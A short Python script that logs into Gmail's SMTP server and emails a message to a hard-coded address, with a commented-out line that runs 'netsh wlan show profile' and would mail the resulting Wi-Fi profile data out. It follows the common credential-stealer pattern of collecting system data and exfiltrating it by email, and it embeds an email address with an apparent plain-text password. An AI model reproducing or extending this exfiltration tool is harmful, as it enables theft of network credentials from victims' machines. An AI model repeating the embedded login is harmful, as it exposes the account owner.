import smtplib,subprocess

def send_mail(email,password,message):
    server=smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()


# command ="netsh wlan show profile"
# result=subprocess.check_output(command,shell=True)
result="hi this is nimesh"
send_mail("nimesh.kulkarni2004@gmail.com","44cu7z8cbn", result)